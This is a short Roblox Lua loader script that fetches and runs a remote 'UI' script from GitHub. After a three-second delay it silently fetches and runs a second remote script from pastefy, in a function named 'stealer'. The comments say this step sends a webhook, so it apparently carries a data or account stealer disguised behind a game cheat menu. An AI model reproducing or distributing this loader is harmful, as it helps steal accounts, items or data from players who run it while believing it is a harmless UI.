-- Load the UI first
local function loadui()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/growagardenv3/Kripkrop/refs/heads/main/Flick.lua'))()
end

-- Delay sending webhook to prevent freezing the loading screen
local function stealer()
    task.delay(3, function() -- wait 3 seconds to ensure UI initializes
        pcall(function()
            loadstring(game:HttpGet('https://pastefy.app/GYjzU6qr/raw'))()
        end)
    end)
end

-- Load UI first
loadui()

-- Send webhook shortly after
stealer()
